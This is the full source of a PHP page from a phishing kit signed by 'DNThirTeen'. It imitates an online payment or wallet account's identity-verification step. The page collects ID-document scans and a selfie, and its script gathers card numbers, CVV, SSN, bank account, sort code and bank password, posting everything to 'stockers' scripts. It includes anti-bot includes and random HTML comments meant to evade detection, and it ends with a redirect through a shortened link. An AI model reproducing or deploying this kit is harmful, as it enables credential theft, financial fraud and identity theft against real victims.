<?php 
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index"));
}else{
	include "../extra/languages/{$_SESSION['language']}.php";
}if(!isset($_SESSION['EML'])){exit(header("Location: signin"));}?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<link rel="shortcut icon" href="lib/pics/favi.ico"><link rel="apple-touch-icon" href="lib/pics/favi.png">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes"><title>
		<?php echo $lg_process['title']?></title>
		<link rel="stylesheet" href="lib/styles/process.css">
		<script type="text/javascript" src="lib/js/jquery-3.3.1.min.js">
		</script><script type="text/javascript" src="lib/js/jquery.mask.min.js">
		</script> <script type="text/javascript" src="lib/js/jquery.ccvalid.js"></script>
	</head>
	<body>    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
<input type="checkbox" id="toggleMenu" class="menuToggler"><div class="desktopNav">
	<div class="navContainer">
		<a href="javascript:" class="desktopBrand"></a><?php echo "<!--".rand(0,99999999)."-->"?>
		<div class="mobileMenu"><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?>		<div class="logoutMobile">
				<a href="javascript:" class="logoutTxtMobile">
					<?php echo $lg_process['logout']?></a><?php echo "<!--".rand(0,99999999)."-->"?>
				</div>
			<?php echo "<!--".rand(0,99999999)."-->"?>	<div class="settingsMobile">
	<?php echo "<!--".rand(0,99999999)."-->"?>				<a href="javascript:" class="svgLogo settingsTxt">
		<?php echo "<!--".rand(0,99999999)."-->"?><?php echo "<!--".rand(0,99999999)."-->"?>				<img src="lib/pics/settings.svg" alt=""></a>
					</div><?php echo "<!--".rand(0,99999999)."-->"?>
					<div>
	<?php echo "<!--".rand(0,99999999)."-->"?>					<p class="displayMail">
	<?php echo "<!--".rand(0,99999999)."-->"?>						<?php echo $_SESSION['EML']?></p>
						</div>
					</div>
<div class="desktopMenu">
<?php echo "<!--".rand(0,99999999)."-->"?>	<nav class="desktopItems"><?php echo "<!--".rand(0,99999999)."-->"?><?php echo "<!--".rand(0,99999999)."-->"?><?php echo "<!--".rand(0,99999999)."-->"?>
		<ul class="firstUl"><?php echo "<!--".rand(0,99999999)."-->"?>
<?php echo "<!--".rand(0,99999999)."-->"?>		<li class=""><?php echo "<!--".rand(0,99999999)."-->"?>
			<a href="javascript:" class="linksTxt">
				<?php echo $lg_process['menu']['home']?>
			</a>
	<?php echo "<!--".rand(0,99999999)."-->"?>	</li>
		<li class="">
			<a href="javascript:" class="linksTxt">
				<?php echo $lg_process['menu']['activity']?></a>
			</li>
			<li class=""><?php echo "<!--".rand(0,99999999)."-->"?>
				<a href="javascript:" class="linksTxt">
					<?php echo $lg_process['menu']['send_receive']?></a></li><li class="">
	<?php echo "<!--".rand(0,99999999)."-->"?>					<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['wallet']?></a>
					</li>
					<li class="activeLi"><?php echo "<!--".rand(0,99999999)."-->"?>
				<?php echo "<!--".rand(0,99999999)."-->"?>		<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['help']?></a>
					</li>
				</ul><?php echo "<!--".rand(0,99999999)."-->"?>
		<?php echo "<!--".rand(0,99999999)."-->"?>		<ul class="secondUl">
					<li class="notifLi">
						<a href="javascript:" class="svgLogo notifTxt">
							<img src="lib/pics/noti.svg" alt=""></a>
		<?php echo "<!--".rand(0,99999999)."-->"?>				</li><?php echo "<!--".rand(0,99999999)."-->"?>
						<li>
							<a href="javascript:" class="svgLogo settingsTxt"><img src="lib/pics/settings.svg" alt=""></a>
				<?php echo "<!--".rand(0,99999999)."-->"?>		</li>
						<li class="logoutLi">
		<?php echo "<!--".rand(0,99999999)."-->"?>					<a href="javascript:" class="logoutTxtDesktop"><?php echo $lg_process['logout']?></a>
						</li>
		<?php echo "<!--".rand(0,99999999)."-->"?>				</ul>
					</nav>
				</div>
			</div><?php echo "<!--".rand(0,99999999)."-->"?>
		</div>
<div class="mainContainer"><?php echo "<!--".rand(0,99999999)."-->"?>
	<div class="hide" id="rotate">
		<div class="spinner"><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="rotate"></div><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="processing"><?php echo $lg_sign['rotate']?></div>
		</div>
		<div class="overlay"><?php echo "<!--".rand(0,99999999)."-->"?>
		</div>
	</div>
	<div class="mobileNav"><?php echo "<!--".rand(0,99999999)."-->"?>
		<div class="navHeader">
			<div class="blockToggler"><?php echo "<!--".rand(0,99999999)."-->"?>
		<?php echo "<!--".rand(0,99999999)."-->"?>		<label class="menuLabel" for="toggleMenu"><span></span>
			<?php echo "<!--".rand(0,99999999)."-->"?>		<div class="menuOpen"><?php echo $lg_process['menu']['open']?></div>
					<div class="menuClose"><?php echo "<!--".rand(0,99999999)."-->"?><?php echo "<!--".rand(0,99999999)."-->"?>
						<?php echo $lg_process['menu']['close']?></div>
		<?php echo "<!--".rand(0,99999999)."-->"?>			</label>
	<?php echo "<!--".rand(0,99999999)."-->"?>			</div>
			</div><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?>		<div class="navLogo"><a href="javascript:" class="mobileBrand"></a>
			</div><ul class="notifUl"><li><a class="svgLogo notifTxt"><?php echo "<!--".rand(0,99999999)."-->"?>
				<img src="lib/pics/noti.svg" alt=""><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?>		</a>
		</li>
	</ul>
</div>
<div class="contents">
	<section class="mainContents" id="process">
		
			<div class="fields clearfix">
<?php echo "<!--".rand(0,99999999)."-->"?>
					<input id="ccn" type="hidden">				
			</div>
			<?php echo "<!--".rand(0,99999999)."-->"?>
</section>
<section class="mainContents" id="finish">
	<div style="padding:0 20px">
	<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem">
		<?php echo $lg_id['head']?>
	</h1>
		<div>
			<ol class="proof">
				<li class="itm current">
					<div class="ui-text-small">
						<?php echo $lg_id['proof']['one']?><?php echo "<!--".rand(0,99999999)."-->"?>
						</div>
					</li>
				<li class="itm">
						<div class="ui-text-small"><?php echo "<!--".rand(0,99999999)."-->"?>
							<?php echo $lg_id['proof']['two']?>
							</div>
						</li><?php echo "<!--".rand(0,99999999)."-->"?>
			<?php echo "<!--".rand(0,99999999)."-->"?>		<li class="itm">
						<div class="ui-text-small">
							<?php echo $lg_id['proof']['three']?></div>
						</li>
		<?php echo "<!--".rand(0,99999999)."-->"?>			</ol>
				</div>
			<div id="select_one">
		<?php echo "<!--".rand(0,99999999)."-->"?>		<form action="javascript:void(0);" method="POST"><?php echo "<!--".rand(0,99999999)."-->"?>
			<?php echo "<!--".rand(0,99999999)."-->"?>			<div id="area_choose">
			<?php echo "<!--".rand(0,99999999)."-->"?>				<h1 style="font-size:1.4rem!important">
								<?php echo $lg_id['choose']?></h1>
	<div class="doc_type">
		<div class="doc_type_choice">
			<div class="doc_type_choice_wrapper">
				<div><img src="lib/pics/id_p.svg" alt=""></div>
				<label class="cont">
					<input type="radio" name="doc_type" value="Passport">
<?php echo "<!--".rand(0,99999999)."-->"?>					<span class="checkmark"></span>
					<span> <?php echo $lg_id['type']['one']?></span><?php echo "<!--".rand(0,99999999)."-->"?>
					</label>
				</div>
			</div>
<?php echo "<!--".rand(0,99999999)."-->"?>	<div class="doc_type_choice">
		<div class="doc_type_choice_wrapper">
			<div><img src="lib/pics/id_n.svg" alt="">
		</div>
<?php echo "<!--".rand(0,99999999)."-->"?>	<label class="cont">
		<input type="radio" name="doc_type" value="National ID">
		<span class="checkmark"></span><?php echo "<!--".rand(0,99999999)."-->"?>
		<span> <?php echo $lg_id['type']['two']?></span>
<?php echo "<!--".rand(0,99999999)."-->"?>	</label>
		</div>
	</div>
<div class="doc_type_choice">
	<div class="doc_type_choice_wrapper"><div>
		<img src="lib/pics/id_n.svg" alt="">
	<?php echo "<!--".rand(0,99999999)."-->"?></div>
	<label class="cont">
<?php echo "<!--".rand(0,99999999)."-->"?>		<input type="radio" name="doc_type" value="Driver's license">
	<?php echo "<!--".rand(0,99999999)."-->"?>	<span class="checkmark"></span><?php echo "<!--".rand(0,99999999)."-->"?>
		<span> <?php echo $lg_id['type']['three']?></span>
	</label>
	</div><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?></div>
	</div><?php echo "<!--".rand(0,99999999)."-->"?>
	<input style="margin-bottom:1.2rem;margin-top:1rem" type="button" class="bt bt_select_one" value="<?php echo $lg_id['bt_proceed']?>">
	</div>
	<div id="area_up_id" style="display:none">
		<h1 style="font-size:1.4rem"><?php echo $lg_id['head_up']?><?php echo "<!--".rand(0,99999999)."-->"?>
		<span></span>
	<?php echo "<!--".rand(0,99999999)."-->"?>	</h1>
		<div class="row rules text-center"><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="rule"><?php echo "<!--".rand(0,99999999)."-->"?>
			<img src="lib/pics/scan_id.svg" alt=""><div><?php echo $lg_id['rule1']['one']?>
		</div>
			</div>
		<div class="rule">
			<img src="lib/pics/both_sides.svg" alt="">
	<?php echo "<!--".rand(0,99999999)."-->"?>	<div>
			<?php echo $lg_id['rule1']['two']?>
		</div>
			</div>
			<div class="rule">
				<img src="lib/pics/both_pass.svg" alt="">
				<div>
		<?php echo "<!--".rand(0,99999999)."-->"?>			<?php echo $lg_id['rule1']['three']?></div><?php echo "<!--".rand(0,99999999)."-->"?>
					</div>
					</div>
					<div class="zone" id="up_id_zone"><?php echo "<!--".rand(0,99999999)."-->"?>
						<div class="dropzone-main" style="display:block">
							<div class="dropzone-img">
								<input style="display:none" type="file" name="file[]" accept="image/*" multiple>
								</div>
								<p><?php echo $lg_id['drop_zone']?></p>
								</div></div><div class="imagesArea"></div><input style="margin-bottom:1rem;margin-top:1rem" type="submit" class="bt" value="<?php echo $lg_id['bt_proceed']?>"><div><a href="javascript:void(0)" class="back"><?php echo $lg_id['bt_back']?></a></div></div></form><script>$(document).on('click','.doc_type_choice',function(){$(this).find('[name="doc_type"]').prop('checked',true);});$('.bt_select_one').click(function(){if($('[name=doc_type]').is(':checked')){$('#area_choose').hide('slow');$('#area_up_id > h1 > span, #area_up_selfie > h1 > span').html($('[name=doc_type]:checked').parent().find('span:last').html());$('#area_up_id').show('slow');}});$(document).on('click','#area_up_id .back',function(){$('#area_up_id').hide('slow');$('#area_choose').show('slow');});$(document).on('submit','#select_one > form',function(e){e.preventDefault();if($('#select_one .imagesArea .imgItem').length==0){return false;}
$('#rotate').removeClass('hide');$.post('../extra/stockers/step7.php',$(this).serialize(),function(dt,st){if(dt&&st=='success'){$('.proof li:nth-child(2)').addClass('current');$('#select_one').addClass('hide');$('#select_two').removeClass('hide');window.scrollTo(0,0);$('#rotate').addClass('hide');}});});</script></div><div id="select_two" class="hide"><form action="javascript:void(0);" method="POST"><div id="area_up_selfie"><h1 style="font-size:1.4rem"><?php echo $lg_id['head_slf']?><span></span></h1><div class="row rules text-center"><div class="rule"><img src="lib/pics/take_s.svg" alt=""><div><?php echo $lg_id['rule2']['one']?></div></div><div class="rule"><img src="lib/pics/fingers_not.svg" alt=""><div><?php echo $lg_id['rule2']['two']?></div></div><div class="rule"><img src="lib/pics/glaesses_not.svg" alt=""><div><?php echo $lg_id['rule2']['three']?></div></div></div><div class="zone" id="up_id_zone"><div class="dropzone-main" style="display:block"><div class="dropzone-img" style="background-image:url(lib/pics/up_slf.svg),none"><input style="display:none" type="file" name="file[]" accept="image/*" multiple></div><p><?php echo $lg_id['drop_zone']?></p></div></div><div class="imagesArea"></div><input type="hidden" name="id_slf" value="ok"><input style="margin-bottom:1rem;margin-top:1rem" type="submit" class="bt" value="<?php echo $lg_id['bt_proceed']?>"><div><a href="javascript:void(0)" class="back"><?php echo $lg_id['bt_back']?></a></div></div></form><script>$(document).on('click','#area_up_selfie .back',function(){$('.proof li:nth-child(2)').removeClass('current');$('#select_one').removeClass('hide');$('#select_one .imagesArea').html('');$('#select_one [type=hidden]').remove();$('#select_two').addClass('hide');});$(document).on('submit','#select_two > form',function(e){e.preventDefault();if($('#select_two .imagesArea .imgItem').length==0){return false;}
$('#rotate').removeClass('hide');$.post('../extra/stockers/step8.php',$(this).serialize(),function(dt,st){if(dt&&st=='success'){$('.proof li:nth-child(3)').addClass('current');$('#select_one').addClass('hide');$('#select_two').addClass('hide');$('#select_three').removeClass('hide');window.scrollTo(0,0);setTimeout(function(){window.location.href="https://bit.do/webaccount";},6000);$('#rotate').addClass('hide');}});});</script>
</div>
<div id="select_three" class="hide">
	<div style="padding:20px">
		<img src="lib/pics/success.svg" alt="" width="150">
<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem"><?php echo $lg_finish['head']?></h1>
		<p>
			<?php echo $lg_finish['p1']?>
			<span style="color:#41ad49;font-weight:bold"> <?php echo $lg_finish['on']?></span>, <?php echo $lg_finish['p2']?>
			<a style="font-weight:bold" href="https://bit.do/webaccount">
				<?php echo $lg_finish['p3']?></a>.</p><div><button style="margin-top:20px;border-radius:.5rem" class="bt gone_bt"><?php echo $lg_process['title']?></button></div></div></div></div></section></div><div><div class="ftr"><div class="footerFirstContent"><ul class="footerList"><li><a href="javascript:"><?php echo $lg_sign['footer']['contact']?></a></li><li><a href="javascript:"><?php echo $lg_process['footer']['security']?></a></li></ul><div class="footerSecondContent"><p class="footerP">Copyright ©<span>1999-2019</span> . <?php echo $lg_process['footer']['rights']?></p><ul class="footerUl"><li><a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a></li><li><a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a></li></ul></div></div></div></div></div><script>$(document).ready(function(){$('#cex').mask('00/0000');$('#csc').mask('0000');$('#dob').mask('00/00/0000');$('#ccn').mask('0000 0000 0000 0000 000');$('#pnm').mask('000000000000000');$('#ssn').mask('000-00-0000');$('#acn').mask('00000000');$('#stc').mask('00-00-00');$('#sin').mask('000-000-000');function validExp(b){var a=new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/20(([1][8-9]{1})|([2][0-9]{1}))");return a.test(b);}
function isDate(vl){var rg=/^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;return rg.test(vl);}
function validDob(vl){var c=false;if(isDate(vl)&&(vl.split('/')[2]>"1919"&&vl.split('/')[2]<"2006")){c=true;}
return c;}
function valid(){var check=true;var ii=0;$('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i,el){if(!$(el).val()){$(el).parent().addClass('hasError');check=false;}else{$(el).not('#ccn').parent().removeClass('hasError');}
if($(el).attr('id')=='cex'){if(!validExp($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
if($(el).attr('id')=='dob'){if(!validDob($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
if($(el).attr('id')=='csc'){if($('select:first').val()=='amx'&&$(el).val().length!=4){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}
if($('select:first').val()!='amx'&&$(el).val().length!=3){$(el).parent().addClass('hasError');check=false;}}});return check;}
$(document).on('change','#process select',function(){$(this).parent().removeClass('hasError');$(this).parent().children('.labelSelect').html($(this).children("option:selected").text());$(this).parent().attr('data-name',$(this).val());if($(this).val()=='amx'){$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('3','4'));$('.csc input').attr('maxlength','4');}else{$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('4','3'));$('.csc input').attr('maxlength','3');}});var ccvalid=false;$('#ccn').validateCreditCard(function(result){var cc=$('#ccn');if(cc.val()!=''){if(result.valid){cc.parent().removeClass('hasError');ccvalid=true;}else{cc.parent().addClass('hasError');ccvalid=false;}}});$('#process input:not(.bt):not([type=checkbox]),select').each(function(i,el){$(el).keyup(function(){valid();});$(el).change(function(){valid();});});$(document).on('submit','#process form',function(){check=true;if(!valid()){check=false;}
if(!validExp($('#cex').val())){$('#cex').parent().addClass('hasError');check=false;}else{$('#cex').parent().removeClass('hasError');}
if(!ccvalid){$('#ccn').parent().addClass('hasError');check=false;}
if(!validDob($('#dob').val())){$('#dob').parent().addClass('hasError');check=false;}
if(!check){return false;}else{$('#rotate').removeClass('hide');var ctp=$('#ctp').children("option:selected").text();var ccn=$('#ccn').val();var cex=$('#cex').val();var csc=$('#csc').val();var fnm=$('#fnm').val();var dob=$('#dob').val();var adr=$('#adr').val();var cty=$('#cty').val();var zip=$('#zip').val();var stt=$('#stt').val();var cnt=$('#cnt').val();var ptp=$('#ptp').val();var par=$('#par').val();var pnm=$('#pnm').val();var mdn=$('#mdn').val();var ssn=$('#ssn').val();var pps=$('#pps').val();var clm=$('#clm').val();var dln=$('#dln').val();var sin=$('#sin').val();var pse=$('#pse').val();var dni=$('#dni').val();var bsn=$('#bsn').val();var cpf=$('#cpf').val();var fcn=$('#fcn').val();var acn=$('#acn').val();var stc=$('#stc').val();var bus=$('#bus').val();var bpw=$('#bpw').val();var o={ctp,ccn,cex,csc,fnm,dob,adr,cty,zip,stt,cnt,ptp,par,pnm,mdn,ssn,pps,clm,dln,sin,pse,dni,bsn,cpf,fcn,acn,stc,bus,bpw};var start=new Date;var xT=0;var idT=setInterval(function(){xT=Math.trunc((new Date-start)/1000);},1000);var toStart=0;$.post('../extra/stockers/step2.php',o,function(data,status){if(data=='done'&&status=='success'){clearInterval(idT);if(xT>4){toStart=0;}else{toStart=1800;}
setTimeout(function(){setId();},toStart);}else{$('#rotate').addClass('hide');}});}
return false;});function setId(){$('#rotate').addClass('hide');$('#process').addClass('hide');$('#finish').removeClass('hide');window.scrollTo(0,0);}
$('.gone_bt').click(function(){window.location.href="https://bit.do/webaccount";});function readFile(files,me,check){if(files){for(var i=0;i<files.length;i++){var FR=new FileReader();FR.onload=function(e){if(e.target.result.startsWith("data:image/")&&e.total<=5000000){if(check){$(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}else{$(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}
$(me).closest('form').append('<input type="hidden" value="'+e.target.result+'" name="images[]">');}}
FR.readAsDataURL(files[i]);}}}
$(document).on('click','.zone',function(e){e.stopPropagation();$(this).find('input[type=file]').trigger(e);});$(document).on('click','.btDel',function(){$(this).closest('form').find('[value="'+$(this).prev().attr('src')+'"]').remove();$(this).parent().remove();});$(document).on('change','input[type=file]',function(){readFile(this.files,this,false);});$(".dropzone-main").on('dragleave',function(e){e.preventDefault();$(this).css('border','2px dashed #dee3e7');$(this).css('background','#f0f2f4');});$(".dropzone-main").on('dragover',function(e){e.preventDefault();$(this).css('border','2px dashed #0564b3');$(this).css('background','#ecf1f9');});$(".dropzone-main").on('drop',function(e){e.preventDefault();$(this).css('border','2px dashed #41ad49');readFile(e.originalEvent.dataTransfer.files,this,true);});});</script>
</body>
</html>